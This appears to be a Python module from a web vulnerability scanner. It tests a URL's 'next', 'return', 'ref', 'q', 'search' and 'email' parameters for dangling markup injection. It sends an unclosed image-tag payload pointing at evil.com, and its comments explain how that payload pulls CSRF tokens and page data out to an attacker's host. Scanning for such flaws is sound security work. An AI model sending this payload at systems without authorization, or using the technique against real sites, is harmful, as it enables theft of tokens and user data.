import asyncio
from modules.core import console

# Dangling Markup Injection (Data Exfiltration via Incomplete Tags)
# Vulnerability: When XSS is blocked by CSP (no script execution), attackers can inject incomplete tags.
# Example: <img src='
# The browser swallows everything following this tag until it sees a matching quote '
# This "dangle" often captures CSRF tokens or user data into the src attribute, sending it to the attacker.
# Detection: Reflected injection of <img src=' without closure.

async def check_dangling(session, url, param):
    try:
        # Payload: Incomplete image tag with unique delimiter
        # <img src='http://attacker.com?log=
        # Only works if reflected.
        
        payload = "<img src='http://evil.com/log?"
        
        target = f"{url}?{param}={payload}"
        if "?" in url: target = f"{url}&{param}={payload}"
        
        async with session.get(target, timeout=5, ssl=False) as resp:
            text = await resp.text()
            
            # If our incomplete tag is reflected exactly, it "might" be swallowing data.
            # We verify if the next quote is far away or exists.
            
            if payload in text:
                 # Check if the tag is 'closed' by the server (sanitized) or left open.
                 # Safe: <img src='http://evil.com/log?'> (Closed immediately)
                 # Vulnerable: <img src='http://evil.com/log? ... [rest of page] ... '
                 
                 # Let's see what follows our payload
                 idx = text.find(payload)
                 snippet = text[idx:idx+100]
                 
                 # If it sees a closing quote immediately or > immediately, it might be safe-ish.
                 # If it doesn't see a quote for a while, it's dangerous.
                 
                 if "'>" not in snippet and "\"/>" not in snippet:
                     return {
                        "url": target,
                        "param": param,
                        "type": "Dangling Markup Injection",
                        "evidence": "Incomplete tag reflected, potentially swallowing content."
                    }

    except Exception:
        pass
    return None

async def scan_dangling(session, url):
    """
    Scan for Dangling Markup (CSP Bypass).
    """
    console.print(f"\n[bold cyan]--- Dangling Markup Scanner ---[/bold cyan]")
    
    params = ["next", "return", "ref", "q", "search", "email"]
    
    tasks = [check_dangling(session, url, p) for p in params]
    results = await asyncio.gather(*tasks)
    
    found = []
    for res in results:
        if res:
             console.print(f"  [bold red][!] DANGLING MARKUP DETECTED: {res['param']}[/bold red]")
             console.print(f"      Evidence: {res['evidence']}")
             found.append(res)
             
    if not found:
        console.print("[dim][-] No Dangling Markup vulnerability indicators found.[/dim]")
        
    return found
